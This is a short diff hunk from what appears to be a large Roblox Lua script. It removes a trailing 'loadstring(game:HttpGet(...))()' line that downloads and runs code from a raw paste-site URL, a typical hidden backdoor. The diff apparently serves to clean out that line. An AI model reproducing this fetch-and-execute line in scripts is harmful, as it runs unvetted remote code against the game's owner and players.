@@ -4312,6 +4312,3 @@ while wait() do local hue = tick() % 15 / 15
 end
 
 
-wait(1)
-
-loadstring(game:HttpGet("https://pastejustit.com/raw/i87yugr321hj", true))()
